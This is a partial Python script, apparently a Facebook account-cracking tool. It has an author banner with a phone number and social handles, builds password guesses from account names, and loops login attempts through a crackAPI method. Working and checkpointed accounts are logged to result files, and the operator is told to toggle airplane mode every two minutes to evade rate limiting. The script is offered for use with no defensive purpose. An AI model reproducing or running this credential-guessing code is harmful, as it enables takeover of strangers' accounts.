...
{P}======================================      
{P}[•] AUTHOR     | | DacTar MaMad 
{P}[•] WATSAPP   | | 0728181281
{P}[•] FACEBOOK | | Asm Mobarak Wahidy 
{P}[•] GITHUN      | | Mamad181281
{P}[•] INSTA         | | Mula_asm
{P}======================================
...
{H}[3]. USER AGENT - V3 (VERY SLOW)
		...
		print(f"""
 {H}[{H}✓{C}] Mamad OK disimpan ke: result/{day}.txt
 {K}[{K}X{C}] Mamad CP disimpan ke: result/{day}.txt
 ...
 {M}[{M}!{C}] nyalakan mode pesawat  setiap 2 menit tod
					...
					for w in password.split(" "):
						if len(w)<3:
							...
							if o=="1":
								...
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w+'123456',w,password.lower()]
								else:
									sandi=[w+'1234567',w,password.lower()]
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r DacTar MaMad [{K}{loop}/{len(internal)}{C}] {H}OK: - {len(success)}{C}  {K}CP: - {len(checkpoint)}{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:
